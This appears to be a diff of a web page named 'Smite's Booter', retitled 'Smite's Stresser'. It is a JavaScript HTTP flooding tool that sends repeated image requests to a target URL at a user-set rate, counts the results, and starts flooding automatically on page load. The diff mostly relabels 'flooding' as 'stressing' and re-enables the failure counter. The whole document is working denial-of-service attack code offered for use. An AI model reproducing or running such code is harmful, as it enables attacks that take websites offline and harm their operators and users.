@@ -1,9 +1,9 @@
     <html>
     <head>  
-        <title>Smite's Booter</title>
+        <title>Smite's Stresser</title>
                 <meta http-equiv="Content-Type" content="text/html; charset=windows-1256" />
     </head>
-    <center><font size="6" color="red"><blink> Smite's Booter </blink> </font></center><br>
+    <center><font size="6" color="red"><blink> Smite's Stresser </blink> </font></center><br>
     <body style="background-color:black; color:#FFFFFF;">
     <div style="position:absolute; width:100%; height:100%;">
     <div style="width:490px; height:326px; position:absolute;">
@@ -18,18 +18,17 @@
     </div>
     <div style="width:240px; height:100px; position:absolute; left:780px;">
          <fieldset style="width:100%; height:100%;">
-           <legend>Select Additional Options Then Click Start</legend>
-     
-            <button id="fireButton" style="background-color:black; border-color:#FFF; color:#FFF; width:240px; height:70px;">Start</button>
+           <legend>Start Stressing</legend>
+            <button id="fireButton" style="background-color:black; border-color:#FFF; color:#FFF; width:240px; height:70px;">Start Stressing</button>
         </fieldset>
     </div>
      
     <div style="width:240px; height:160px; position:absolute; left:500px; top:150px;">
          <fieldset style="width:100%; height:100%;">
             <legend>Misc. Options</legend>
-             <label>Requests Per Second: <input style="width:40px;" id="rps" value="100" /></label><br />
+             <label>Requests Per Second: <input style="width:40px;" id="rps" value="100"/></label><br />
      
-             <label>HTTP Message: <br /><input style="width:100%;" id="message" value="Turn Down For What" /></label>
+             <label>HTTP Message: <br /><input style="width:100%;" id="message" value="Turn Down For What"/></label>
         </fieldset>
     </div>
      
@@ -77,8 +76,7 @@
                         img.onerror = function () { onFail(rID); };
                         img.onabort = function () { onFail(rID); };
                         img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
-                                           
-                                            img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);
+			img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value);
                         requestsHT[rID] = img;
                         onRequest(rID);
                     };
@@ -93,10 +91,9 @@
                     };
      
                 var onFail = function (rID) {
-                       // failedCtr++;
-                        //failedCtrNode.innerHTML = failedCtr;
-                                           
-                                            succeededCtr++; //Seems like the url will always fail it it isn't an image
+                        failedCtr++;
+                        failedCtrNode.innerHTML = failedCtr;                  
+                        succeededCtr++; //Seems like the url will always fail it it isn't an image
                         succeededCtrNode.innerHTML = succeededCtr;
                         delete requestsHT[rID]; // we can't keep it forever or it would blow up the browser
                     };
@@ -111,17 +108,15 @@
                     if (isFiring) {
                         clearInterval(fireInterval);
                         isFiring = false;
-                        this.innerHTML = "START";
+                        this.innerHTML = "Start Stressing";
                     } else {
                         isFiring = true;
-                        this.innerHTML = "Stop flooding";
-     
+                        this.innerHTML = "Stop Stressing";
                         fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0));
                     }
                 };
      
             })();
-     
     isFiring = true;
     document.getElementById("fireButton").innerHTML = "Start";
     fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(document.getElementById("rps").value) | 0));
